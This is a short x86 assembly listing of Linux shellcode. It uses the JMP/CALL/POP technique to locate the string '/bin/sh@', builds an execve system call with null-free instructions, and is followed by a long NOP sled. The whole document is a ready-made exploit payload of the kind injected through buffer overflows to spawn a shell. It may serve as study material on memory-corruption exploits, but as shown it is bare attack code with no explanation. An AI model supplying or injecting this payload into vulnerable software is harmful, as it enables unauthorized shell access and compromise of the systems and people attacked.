JMP _WANT_BIN_BASH
_GOT_BIN_BASH:
XOR EAX, EAX # safe null
ADD EAX, 0xB
POP EBX
XOR EDX, EDX # safe null
XOR DL, DL # safe null
MOV BYTE PTR [EBX+7], DL
MOV ECX, EDX # no args
INT 0x80
_WANT_BIN_BASH:
CALL _GOT_BIN_BASH
.ASCII "/bin/sh@"
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
